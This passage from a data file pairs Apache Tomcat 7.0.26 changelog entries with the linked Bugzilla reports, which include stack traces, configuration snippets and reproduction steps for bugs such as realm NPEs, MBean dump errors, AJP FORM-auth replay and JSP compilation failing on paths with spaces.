Therefore, creating ""click here to retry"" links is impossible without workaround code.

The critical issue here is the deviation from the servlet spec, which spells out the behavior of those attributes."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52586
Catalina|Tomcat 7.0.26 (markt)|fix|52587|Ensure that if it is necessary to fall back to the default NullRealm, the NullRealm instance is created early enough for it to be correctly initialised. (markt)|NPE in authenticator when no realm/resource is defined|"When no Realm is available to authenticate against, an NPE is thrown.

STR:

1. Start with a stock 7.0.25 and modify server.xml:
2. Comment-out <Resource> in <GlobalNamingResources>
3. Comment-out <Realm> in <Engine>
4. Deploy manager app and try to log in

java.lang.NullPointerException
	org.apache.catalina.realm.RealmBase.authenticate(RealmBase.java:340)
	org.apache.catalina.authenticator.BasicAuthenticator.authenticate(BasicAuthenticator.java:158)
	org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:544)
	org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
	org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
	org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:987)
	org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
	org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1600)
	java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	java.lang.Thread.run(Thread.java:680)


Clearly, this is a pathological setup, but it might be nice to get a decent error message instead of an NPE."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52587
Catalina|Tomcat 7.0.26 (markt)|fix||Fix millisecond output in AccessLogValve when using a SimpleDateFormat based time pattern. (rjung)|||
Catalina|Tomcat 7.0.26 (markt)|fix|52591|When dumping MBean data, skip attributes where getters throw UnsupportedOperationException. (markt)|UnsupportedOperationException logged when fetching BasicDataSource 'loginTimeout'|"With a BasicDataSource configured (using a <Resource>), simply list the available MBeans and this exception will be emitted to stdout:

SEVERE: Error getting attribute Catalina:type=DataSource,context=/context,host=localhost,class=javax.sql.DataSource,name=""jdbc/myDataSource"" loginTimeout
javax.management.RuntimeOperationsException: Exception invoking method loginTimeout
        at org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:197)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:666)
        at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638)
        at org.apache.catalina.mbeans.MBeanDumper.dumpBeans(MBeanDumper.java:81)
        at org.apache.catalina.manager.JMXProxyServlet.listBeans(JMXProxyServlet.java:166)
        at org.apache.catalina.manager.JMXProxyServlet.doGet(JMXProxyServlet.java:121)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
[...]
Caused by: java.lang.UnsupportedOperationException: Not supported by BasicDataSource
        at org.apache.tomcat.dbcp.dbcp.BasicDataSource.getLoginTimeout(BasicDataSource.java:1083)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)


This exception does not cause the request to fail, but definitely puts an ugly stack trace in catalina.out. It might be better to catch UnsupportedOperationException and emit a one-line error message -- one that isn't SEVERE."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52591
Catalina|Tomcat 7.0.26 (markt)|fix|52607|Ensure that the extension validator checks the JARs in the shared and common class loaders for extensions. (markt)|"It is not well defined how ""Dependencies on extensions"" mechanism can be used in Tomcat"|"Hi,

As a result of the mail thread [1] I'm opening a bug.

In short it is not clear how exactly ""Dependencies on extensions"" mechanism can be used.

I have two proposals:

1. Tomcat can continue to use in its implementation a separate property (""catalina.ext.dirs"") that provides extensions' location. But its value should be added by default to the Tomcat's classpath directories (e.g. ""shared.loader"").
- Pros: Tomcat users will know that this property specifies the directory for their extensions and only the files located there will be scanned during ExtensionValidator.validateApplication invocation.
- Cons: Additional configuration that has to be maintained.

2. Tomcat can remove this separate property (""catalina.ext.dirs"") and start searching for such extensions in the Tomcat's classpath directories (e.g. shared.loader).
- Pros: No additional configuration is needed. One can specify the shared libraries and the extensions with one and the same property.
- Cons: During ExtensionValidator.validateApplication, it may appear that a lot of files are scanned which might be not necessary.

I'm willing to provide a patch once we agree on the solution. My favourite is the first proposal.

I'm looking forward to your comments.
Thanks in advance.

Regards,
Violeta Georgieva

[1] http://marc.info/?t=132827584600009&r=1&w=2"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52607
Catalina|Tomcat 7.0.26 (markt)|fix||Correct a threading issue in the generation of the list of standard authenticators during Context initialization that could lead to a web application failing to start if Contexts were started in parallel. (markt)|||
Catalina|Tomcat 7.0.26 (markt)|fix|52669|Correct regression that broke annotation processing in /WEB-INF/classes for web applications deployed as WARs, packageless classes and some embedding scenarios. The regression was introduced by the invalid assumptions made in the fix for 51741. (markt)|Annotation processing, in WEB-INF/classes, for Servlets/Listeners/Filters is skipped when the web app is not extracted, classes do not have packages and for some embedded scenarios|"Hi,

Annotation processing for Servlets/Listeners/Filters is skipped when:
- the web app is not extracted (screenshot1), 
- classes do not have packages (screenshot2),
- for some embedded scenarios (running Tomcat in OSGI environment - screenshot3)

A test web application is attached - test-web-app.war.

I followed the history and the change that introduces that behaviour is made with revision 1210012.



org.apache.catalina.startup.ContextConfig

The annotations are processed correctly in all use cases when we have:

1199    URL webinfClasses;
1200    try {
1201        webinfClasses = context.getServletContext().getResource(
1202                                ""/WEB-INF/classes"");
1203        processAnnotationsUrl(webinfClasses, webXml);
1204    } catch (MalformedURLException e) {
1205        log.error(sm.getString(
1206                                ""contextConfig.webinfClassesUrl""), e);
1207    }


The way how they are processed now is assuming that we will have FirDirContext always.

1196    try {
1197        NamingEnumeration<Binding> listBindings =
1198                    context.getResources().listBindings(""/WEB-INF/classes"");
1199        while (listBindings.hasMoreElements()) {
1200            Binding binding = listBindings.nextElement();
1201            if (binding.getObject() instanceof FileDirContext) {
1202               File webInfCLassDir =
1203                     new File(
1204                       ((FileDirContext) binding.getObject()).getDocBase());
1205               processAnnotationsFile(webInfCLassDir, webXml);
1206            }
1207        }
1208    } catch (NamingException e) {
1209        log.error(sm.getString(
1210                            ""contextConfig.webinfClassesUrl""), e);
1211    }


Regards
Violeta Georgieva"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52669
Catalina|Tomcat 7.0.26 (markt)|fix|52671|When dumping MBean data, skip attributes where getters throw NullPointerException. (markt)|NIO Connector: Exception invoking method readBufSize / writeBufSize in the JMX Proxy Servlet|"JDK versions tested with: 1.7.0_02 (x64) and 1.7.0_03 (x64)


I am using the new NIO connector, configured like this:

   <Connector protocol=""org.apache.coyote.ajp.AjpNioProtocol""
               port=""8009"" redirectPort=""8443"" URIEncoding=""UTF-8""
               maxThreads=""50"" minSpareThreads=""10""
               connectionTimeout=""600000""
               acceptorThreadCount=""2"" />


I query the JMX proxy for the thread pool status like this:

http://www.mydomain.com/manager/jmxproxy/?qry=Catalina:type=ThreadPool,name=%22ajp-nio-8009%22

The JMX proxy servlet returns a valid response, and the server's general operation is not affected in any way.


But at the same time, Tomcat logs the following two exceptions to catalina.out:

Feb 15, 2012 12:26:49 PM org.apache.catalina.mbeans.MBeanDumper dumpBeans
Schwerwiegend: Error getting attribute Catalina:type=ThreadPool,name=""ajp-nio-8009"" readBufSize
javax.management.RuntimeOperationsException: Exception invoking method readBufSize
        at org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:197)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:647)
        at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:668)
        at org.apache.catalina.mbeans.MBeanDumper.dumpBeans(MBeanDumper.java:81)
        at org.apache.catalina.manager.JMXProxyServlet.listBeans(JMXProxyServlet.java:166)
        at org.apache.catalina.manager.JMXProxyServlet.doGet(JMXProxyServlet.java:121)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169)
        at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:581)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
        at org.apache.coyote.ajp.AjpNioProcessor.process(AjpNioProcessor.java:184)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1600)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.NullPointerException
        at org.apache.tomcat.util.net.SocketProperties.getRxBufSize(SocketProperties.java:251)
        at org.apache.tomcat.util.net.NioEndpoint.getReadBufSize(NioEndpoint.java:613)
        at sun.reflect.GeneratedMethodAccessor1196.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:190)
        ... 25 more

Feb 15, 2012 12:26:49 PM org.apache.catalina.mbeans.MBeanDumper dumpBeans
Schwerwiegend: Error getting attribute Catalina:type=ThreadPool,name=""ajp-nio-8009"" writeBufSize
javax.management.RuntimeOperationsException: Exception invoking method writeBufSize
        at org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:197)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:647)
        at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:668)
        at org.apache.catalina.mbeans.MBeanDumper.dumpBeans(MBeanDumper.java:81)
        at org.apache.catalina.manager.JMXProxyServlet.listBeans(JMXProxyServlet.java:166)
        at org.apache.catalina.manager.JMXProxyServlet.doGet(JMXProxyServlet.java:121)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169)
        at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:581)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
        at org.apache.coyote.ajp.AjpNioProcessor.process(AjpNioProcessor.java:184)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1600)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.NullPointerException
        at org.apache.tomcat.util.net.SocketProperties.getTxBufSize(SocketProperties.java:283)
        at org.apache.tomcat.util.net.NioEndpoint.getWriteBufSize(NioEndpoint.java:609)
        at sun.reflect.GeneratedMethodAccessor1151.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:190)
        ... 25 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52671
Coyote|Tomcat 7.0.26 (markt)|add|51543|Provide a meaningful error message when writing more response headers than permitted. (markt)|Space in username not properly escaped in log files (%u)|"Spaces, if any, in a username are not being properly escaped when they are written to logs (as part of %u). The normal logs use space as a delimiter between field, so have an unescaped space screws up all log processing for anything involving usernames (%u) with spaces.

This is ESPECIALLY a problem for user SSL certificates, because organizations (O=) typically include a space character, e.g., ""U.S. Government"".  Even the Apache docs show an organization ""O="" with a space in: http://httpd.apache.org/docs/2.2/ssl/ssl_howto.html.  Thus, if usernames are actually user SSL certificates, then anyone with an organization having a space in it (including U.S. Government"") will have a corrupted log entry.

Note that the DEFAULT log format includes %u.

This is NOT the same as bug 28117, because this involves whitespace not backslashes.

Here's an example of the format I see in the log files:
1.2.3.4 ""-"" /C=US/O=U.S. Government/OU=DoD/OU=PKI/OU=CONTRACTOR/CN=someNAME.someNUMBER [22/Jul/2011:14:56:50 -0400] ""GET /somestuff HTTP/1.1"" 200 4319
Notice that ""U.S. Government"" has an embedded space.  But a leading ""/"" doesn't tell anyone where it begins or ends.

I don't know which escape mechanism is the right one for usernames.  I can imagine %20 working.  Alternatively, surround it with double-quotes if there's an embedded space, and escape double-quote as a pair of double-quotes inside that.  The key is to pick one.

I have confirmed that this happens in httpd version 2.2.3 of CentOS version 5.6.  I don't know for sure if it happens in later versions, though I suspect it does.  However, I'm seeing this in a production system, and I don't have the luxury of upgrading to latest version of Apache.  I originally found this problem when trying to parse a log using the Apachelog Python library at http://code.google.com/p/apachelog/downloads/list but I don't think the library is at fault here.

Thanks!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51543
Coyote|Tomcat 7.0.26 (markt)|fix|52547|Ensure that bytes written (which is used by the access log) is correctly reset after an HTTP 1.0 request has been processed. (markt)|incorrect byeswritten log after completed async request under http1.0|"AbstractHttp11Processor does not call nextRequest() if the socket will be closed because keepAlive=false (i.e. http/1.0).

See line 1539 in
http://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_25/java/org/apache/coyote/http11/AbstractHttp11Processor.java

Presumably the recycle() caused by the socket close is expected to subsume the behaviour of nextRequest()

But in AbstractOutputBuffer recycle() does not have byteCount = 0, whereas nextRequest() does.

See lines 260, 280 in
http://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_25/java/org/apache/coyote/http11/AbstractOutputBuffer.java

The result is that the bytesWritten log of the following request will be incorrectly increased by the size of the async http/1.0 request"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52547
Coyote|Tomcat 7.0.26 (markt)|code||Minor refactoring to reduce code duplication in the HTTP connectors. (markt)|||
Coyote|Tomcat 7.0.26 (markt)|fix|52606|Ensure that POST bodies are available for reply after FORM authentication when using the AJP connectors. (markt)|FORM authentication POST replay broken for AJP|"Reported and discussed in the following thread on users@:
""Form Authentication POST data not preserved?""
http://markmail.org/message/pldgbe4jbnb46ha4
http://marc.info/?t=132830976900001&r=1&w=2

This supposedly has the same trigger as the issue reported in Comment 9 in bug 51940 [3], that is consuming the body of the original request before replacing it.

[3] https://issues.apache.org/bugzilla/show_bug.cgi?id=51940#c9

In AbstractAjpProcessor$SocketInputBuffer#doRead() there is a check for ""endOfStream"" flag. If the flag is set the method returns immediately and does not use the bodyBytes field that was initialized to replay the body.

The fix is to add the following line to ""REQ_SET_BODY_REPLAY"" case in
AbstractAjpProcessor#action(), as confirmed on the users@ thread:

  endOfStream = false;


In 6.0.x implementation of AjpProcessor$SocketInputBuffer and of replay action is the same, but I have not tested whether this bug can be triggered there or not."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52606
Jasper|Tomcat 7.0.26 (markt)|fix|52474|Ensure that leading and trailing white space is removed from listener class names when parsing TLD files. (markt)|Do not load listeners declared with blank spaces on tld file.|"Created attachment 28163 [details]
debugging tomcat source

Do not load listeners declared with blank spaces on tld file.
Removing blank spaces the application run."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52474
Jasper|Tomcat 7.0.26 (markt)|fix|52480|When converting class path entries from URLs to files/directories, ensure that any URL encoded characters are converted. Fixes JSP compilation with javac when Tomcat is installed at a path that includes spaces. (markt)|TC7 + AntCompiler problems with whitespace in pathname|"### Overview

Bug opened for Linux but it also happens on Windows - see below for detailed environments.

TC fails to compile JSP when:
    1) the compiler is AntCompiler
and 2) there is a whitespace somewhere in the absolute pathname to TC home dir.

It may also fail when the absolute pathname to TC home dir contains non URI-compatible characters but I have tested only with whitespace.

Configuring logging.properties to have AntCompiler set to level FINEST, logs show that:
- whitespace is translated to ""%20"";
- javac task fails with many errors, the first being ""package javax.servlet does not exist"".

Our tests show that:
- When AntCompiler is used AND tomcat is installed in a directory whose absolute pathname does NOT contain any whitespace, compilation is ok.
- When AntCompiler is used AND tomcat is installed in a directory whose absolute pathname DOES contain at least one whitespace, compilation fails.
- When JDTCompiler is used, compilation is ok (whitespace or not).

This has been tested with the two environments described below (+ steps to reproduce).


### History

Some discussion has hapened on Tomcat mailing list on January 2011 and ""markt at apache.org"" wrote I should fill a bug (my initial mail subject is ""TC7 + AntCompiler problems with whitespace in pathname"", posted January 17th 2011 around midnight, French time zone).

Following ""aw at ice-sa.com""'s advice on the mailing list, I googled with ""deployment"" and found this:
- TC6: In CGI Mode, ""executable"" full path with spaces does not work
  https://issues.apache.org/bugzilla/show_bug.cgi?id=49657
- TC5: Tomcat fails to start on linux if CATALINA_HOME contains a space
  https://issues.apache.org/bugzilla/show_bug.cgi?id=43578
- TC5: java.endorsed.dirs is not used when JSP compilation is forked (see comment #2)
  https://issues.apache.org/bugzilla/show_bug.cgi?id=31257#c2

It looks like having spaces ought to be ok.

Note: on Windows, the installation wizard deploys TC into ""C:\Program Files\Apache Software Foundation"" which contains many spaces.


### Background

Q: Why not use JDTCompiler?

A: We have at least one ""huge"" JSP that fails to compile with JDTCompiler (""unresolved compilation error""). When we delete code from this JSP, it compiles. We could resolve the problem for this specific JSP but we have not found what makes the boundary between ""it compiles"" and ""it does not compile"" (tried suppressSmap=false, development=false). We can not afford to deploy our application on a production server with a compiler that might ""randomly"" fail on some other JSP. Previous version of our application has always been compiled with Sun / Oracle JDK: we prefer not to change the compiler brand.


### Build & Platform

Test environment #1:
- OS is Linux 32 bits (Ubuntu 10.04 LTS)
- TC is tomcat-7.0.23
- Files ant.jar + ant-launcher.jar from ant-1.8.2 copied to tomcat lib dir
- File tools.jar copied from JDK to tomcat lib dir
- ""javac -version"" returns
    javac 1.6.0_26
- ""java -version"" returns
   java version ""1.6.0_26""
   Java(TM) SE Runtime Environment (build 1.6.0_26-b03)
   Java HotSpot(TM) Client VM (build 20.1-b02, mixed mode, sharing)

Test environment #2:
- OS is Windows 7 64 bits
- TC is tomcat-7.0.23
- Files ant.jar + ant-launcher.jar from ant-1.8.2 copied to tomcat lib dir
- File tools.jar copied from JDK to tomcat lib dir
- ""javac.exe -version"" returns
    javac 1.7.0
- ""java.exe -version"" returns
    java version ""1.7.0""
    Java(TM) SE Runtime Environment (build 1.7.0-b147)
    Java HotSpot(TM) 64-Bit Server VM (build 21.0-b17, mixed mode)

Note: same results with Windows 2008 R2

### Steps to reproduce

Each test begins this way:
- Extract apache-tomcat-7.0.23.tar.gz to <SOME_DIR>
- Depending on test <SOME_DIR> absolute pathname contains a space or not
- Download apache-ant-1.8.2-bin.tar.gz
- Extract to any temp directory
- Copy apache-ant-1.8.2/lib/ant.jar + apache-ant-1.8.2/lib/ant-launcher.jar to <SOME_DIR>/lib
- Forget ant (extracted directory can be deleted)
- Copy JDK lib/tools.jar to <SOME_DIR>/lib (mandatory when fork=false, see below)
- Update original web.xml this way (starting at line 230):
    <servlet>
        <servlet-name>jsp</servlet-name>
        <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
        <init-param>
            <param-name>fork</param-name>
            <param-value>false</param-value> <!-- true: same failure -->
        </init-param>
        <init-param>
            <param-name>xpoweredBy</param-name>
            <param-value>false</param-value>
        </init-param>
        <init-param>
            <param-name>compiler</param-name>
            <param-value>javac1.6</param-value> <!-- 1.7 if JDK 1.7 is used -->
        </init-param>
        <init-param>
            <param-name>suppressSmap</param-name>
            <param-value>true</param-value>
        </init-param>
        <load-on-startup>3</load-on-startup>
    </servlet>
- Delete <SOME_DIR>/work to be sure not to run with any previous compilation results
- Run tomcat with startup.sh (or startup.bat if running on Windows)
- Go to http://localhost:8080
- When <SOME_DIR> absolute pathname contains a space, it fails, else it works.


### Actual Results

Our tests:
- Env#1, SOME_DIR=""/mnt/DSK2/tmp/tc/tc 7.0.23"" => FAILS
- Env#1, SOME_DIR=""/mnt/DSK2/tmp/tc/apache-tomcat-7.0.23"" => WORKS
- Env#2, SOME_DIR=""C:\Users\ekp\Desktop\Work tc7\apache-tomcat-7.0.23"" => FAILS
- Env#2, SOME_DIR=""C:\tc7\apache-tomcat-7.0.23"" => WORKS


### Expected Results

TC should compile JSP even if the absolute pathname to TC home dir contains a space (or, I suppose, any other non URI-compatible character).

This is especially disturbing on Windows because the TC installer deploys into ""C:\Program Files\Apache Software Foundation"" which contains many spaces.


### Excerpts from log file, FAIL case on environment #1

[ translation : ""FIN"" = fine ; ""PLUS FIN"" = finer / finest ; ""GRAVE"" = failure ]

16 janv. 2012 23:19:12 org.apache.jasper.compiler.JspRuntimeContext initClassPath
FIN: Compilation classpath initialized: /mnt/DSK2/tmp/tc/tc 7.0.23/work/Catalina/localhost/manager:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tools.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-dbcp.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-jdbc.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jasper-el.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ant.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-es.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ant-launcher.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/annotations-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-util.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/el-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-coyote.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jasper.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jsp-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/servlet-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-ja.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-tribes.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-fr.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-ant.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ecj-3.7.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-ha.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/bin/tomcat-juli.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunpkcs11.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/localedata.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunjce_provider.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/dnsns.jar
[...]
16 janv. 2012 23:19:18 org.apache.jasper.compiler.AntCompiler generateClass
FIN: Using classpath: /mnt/DSK2/tmp/tc/tc 7.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/tc 7.0.23/bin/tomcat-juli.jar:/mnt/DSK2/tmp/tc/tc 7.0.23/work/Catalina/localhost/_:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tools.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-dbcp.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-jdbc.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jasper-el.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ant.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-es.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ant-launcher.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/annotations-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-util.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/el-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-coyote.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jasper.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/jsp-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/servlet-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-ja.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-api.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-tribes.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/tomcat-i18n-fr.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-ant.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/ecj-3.7.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/lib/catalina-ha.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/bin/bootstrap.jar:/mnt/DSK2/tmp/tc/tc%207.0.23/bin/tomcat-juli.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunpkcs11.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/localedata.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/sunjce_provider.jar:/usr/lib/jvm/java-6-sun-1.6.0.26/jre/lib/ext/dnsns.jar
16 janv. 2012 23:19:18 org.apache.jasper.compiler.AntCompiler generateClass
GRAVE: Javac exception
Compile failed; see the compiler error output for details.
        at org.apache.tools.ant.taskdefs.Javac.compile(Javac.java:1150)
        at org.apache.tools.ant.taskdefs.Javac.execute(Javac.java:912)
        at org.apache.jasper.compiler.AntCompiler.generateClass(AntCompiler.java:234)
[...]
16 janv. 2012 23:19:18 org.apache.jasper.compiler.AntCompiler generateClass
GRAVE: Environment: Compile: javaFileName=/mnt/DSK2/tmp/tc/tc 7.0.23/work/Catalina/localhost/_/org/apache/jsp/index_jsp.java
